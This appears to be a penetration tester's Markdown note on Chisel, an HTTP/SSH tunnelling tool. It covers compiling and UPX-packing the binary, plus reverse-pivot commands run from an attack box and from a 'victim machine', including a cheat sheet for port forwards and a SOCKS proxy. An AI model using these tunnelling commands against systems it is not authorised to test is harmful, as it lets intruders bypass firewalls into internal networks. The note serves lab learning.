# Chisel

[Chisel](https://github.com/jpillora/chisel.git) *"is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network."*

![](chiselworksthisway.png)

## Compilation and Shrinking the binary

```bash
#!/bin/bash
git clone https://github.com/jpillora/chisel.git 
cd chisel/
# On Victim machine:
ldd --version # linux and windows


# To mimise binary size
# -s strip binary of debug info
# -w strip of dwarf infomation
go build -ldflags="-s -w"
upx chisel

# IPsec stuff I failed to get working
go build -ldflags="-s -w"
upx brute chisel
chiselsize=$(du -hs chisel)
echo "Chisel is now ready and minimised: "
echo $chiselsize
```

## Reverse Pivot with Chisel Explained:

Chisel is useful when you can not port forward with ssh. You would then need chisel for reverse pivoting, which is the reverse of port forward as the  **Remote box is listening** to connect back the attack to open up the tunnel. For information about [[Port-Redirection-And-Tunneling]].

```bash
# AttackBox
chisel server -host 127.0.0.1 -p 8000 -reverse # -v is useful for checking connection 
# Client
chisel client $attackboxIP:8000 R:8001:$clientip:$port
# Accessing through the tunnel on Attackbox
curl 127.0.0.1:8001 # will then access $clientip:$port
```

## 0xDF's TD;DR Cheat Sheet 

Start server listening on 8000:

`./chisel server -p 8000 --reverse`

From victim machine:

Command | Description
--- | ---
`chisel client 10.10.14.3:8000 R:80:127.0.0.1:80` | Listen on Kali 80, forward to localhost port 80 on client
`chisel client 10.10.14.3:8000 R:4444:10.10.10.240:80` | Listen on Kali 4444, forward to 10.10.10.240 port 80
`chisel client 10.10.14.3:8000 R:socks` | Create SOCKS5 listener on 1080 on Kali, proxy through clie

For SOCKS proxies don't forget `proxychains` and it configuration!


## References

[0xDF Tunneling with Chisel and SSF](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)